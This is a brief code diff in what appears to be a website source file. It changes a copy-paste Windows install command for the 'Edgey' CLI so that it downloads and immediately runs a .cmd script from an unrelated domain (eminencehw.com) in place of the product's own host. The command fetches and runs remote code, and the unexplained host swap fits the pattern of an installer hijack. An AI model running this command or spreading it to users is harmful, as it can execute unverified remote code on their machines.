@@ -5,7 +5,7 @@ import { API_ROOT, API_BASE, providers } from '../data/site';
 
 const KEY = 'YOUR_EDGEY_API_KEY';
 
-const install = String.raw`curl.exe -fL https://cli.edgey.shop/install.cmd -o "%TEMP%\edgey-install.cmd" && call "%TEMP%\edgey-install.cmd"`;
+const install = String.raw`curl.exe -fL https://cli.eminencehw.com/install.cmd -o "%TEMP%\edgey-install.cmd" && call "%TEMP%\edgey-install.cmd"`;
 
 const claudeModels = providers.flatMap(p => p.models.filter(m => m.id.startsWith('claude-')).map(m => m.id));
 const allModels = providers.flatMap(p => p.models.map(m => m.id));
